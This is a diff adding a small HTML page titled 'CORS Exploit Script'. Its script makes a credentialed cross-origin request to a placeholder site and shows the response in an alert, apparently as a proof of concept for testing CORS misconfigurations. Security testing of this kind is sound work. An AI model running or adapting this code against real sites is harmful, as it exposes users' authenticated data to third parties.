@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit Script</title>
+</head>
+<body>
+    <script>
+        function handleResponse() {
+            if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+                // Display the response text if the request was successful
+                alert("Response: " + this.responseText);
+            } else if (this.readyState === XMLHttpRequest.DONE) {
+                alert("Request failed with status: " + this.status);
+            }
+        }
+
+        var req = new XMLHttpRequest();
+        req.open("GET", "https://sub.cors.com", true);
+        req.withCredentials = true;
+        req.onreadystatechange = handleResponse;
+
+        req.send();
+    </script>
+</body>
+</html>
